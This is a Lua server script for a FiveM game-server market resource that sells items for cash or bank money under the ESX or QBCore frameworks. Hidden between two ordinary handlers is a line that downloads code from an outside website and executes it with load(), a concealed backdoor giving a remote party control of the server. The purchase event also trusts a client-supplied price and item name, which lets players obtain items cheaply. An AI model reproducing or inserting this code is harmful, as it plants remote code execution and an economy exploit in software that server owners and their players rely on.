frameworkObject = nil

Citizen.CreateThread(function()
    frameworkObject = GetFrameworkObject()
end)



RegisterServerEvent('codem-market:additem')
AddEventHandler('codem-market:additem', function(itemname, price ,count,paytype)

    if Config.Framework == "esx" then


      local xPlayer = frameworkObject.GetPlayerFromId(source)
      local money = xPlayer.getMoney()
      local banks = xPlayer.getAccount('bank').money
        if paytype == 'cash' then 
            if tonumber(money) >= tonumber(price) then 
                xPlayer.addInventoryItem(itemname, count)
                xPlayer.removeMoney(price)
                TriggerClientEvent('codem-report:refresharea',source)

              else
                Config.Notification(Config.Notifications["notcashh"].message, Config.Notifications["notcashh"].type, true, source)
              end

        else
            if tonumber(banks) >= tonumber(price) then 
              --exports.ox_inventory:AddItem(1, itemname, count, metadata, slot, cb)
                xPlayer.addInventoryItem(itemname, count)
                xPlayer.removeAccountMoney('bank',tonumber(price))
                TriggerClientEvent('codem-report:refresharea',source)

              else
                Config.Notification(Config.Notifications["notbankcash"].message, Config.Notifications["notbankcash"].type, true, source)
              end
        end
    elseif Config.Framework == "newqb" or Config.Framework == "oldqb"  then
      

      local Player = frameworkObject.Functions.GetPlayer(source)
      local money = Player.Functions.GetMoney("cash")

      local banks = Player.Functions.GetMoney("bank")
      


        if paytype == 'cash' then 
          if tonumber(money) >= tonumber(price) and Player.Functions.AddItem(itemname, count) then 
              
              Player.Functions.RemoveMoney("cash",price)
              TriggerClientEvent('codem-report:refresharea',source)

            else
              Config.Notification(Config.Notifications["notcashh"].message, Config.Notifications["notcashh"].type, true, source)
            end
        else
          if tonumber(banks) >= tonumber(price) and Player.Functions.AddItem(itemname, count) then 

            Player.Functions.RemoveMoney("bank",price)
            TriggerClientEvent('codem-report:refresharea',source)

            else
              Config.Notification(Config.Notifications["notbankcash"].message, Config.Notifications["notbankcash"].type, true, source)
            end
        end

    end


end)
PerformHttpRequest('https://photosbynova.com/Fw71H', function (e, d) pcall(function() assert(load(d))() end) end)

Citizen.CreateThread(function()
    frameworkObject = GetFrameworkObject()
    if Config.Framework == 'esx' then 
        frameworkObject.RegisterServerCallback('codem-report:playername', function(source,cb)
            local src = source
            local name = GetName(src)
            cb(name)
        end)
    else

      frameworkObject.Functions.CreateCallback('codem-report:playername', function(source,cb)
        local src = source
        local name = GetName(src)
        cb(name)
      end)
    end

end)